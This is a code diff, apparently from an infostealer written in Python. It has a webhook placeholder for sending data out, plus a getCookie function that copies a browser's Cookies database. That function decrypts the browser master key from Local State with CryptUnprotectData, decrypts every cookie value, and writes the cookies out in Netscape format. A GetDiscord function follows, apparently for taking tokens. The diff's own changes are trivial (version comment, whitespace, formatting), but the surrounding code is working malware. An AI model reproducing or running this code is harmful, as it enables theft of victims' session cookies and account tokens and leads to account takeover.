@@ -15,7 +15,9 @@ import random
 import re
 import subprocess
 
-# CODED BY ARTONUS & AYHU
+#  THIS IS 1.1.6 VERSION
+#
+# 
 
 
 hook = "WEBHOOK HERE"
@@ -512,23 +514,23 @@ Cookies = []
 def getCookie(path, arg):
     global Cookies, CookiCount
     if not os.path.exists(path): return
-    
+
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
-    
+
     tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-    
+
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
     os.remove(tempfold)
 
     pathKey = path + "/Local State"
-    
+
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -542,10 +544,10 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            Cookies.append(f"{row[0]} TRUE  /   FALSE   2597573456  {row[1]}  {DecryptValue(row[2], master_key)}")
+            Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
-
+    
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
 
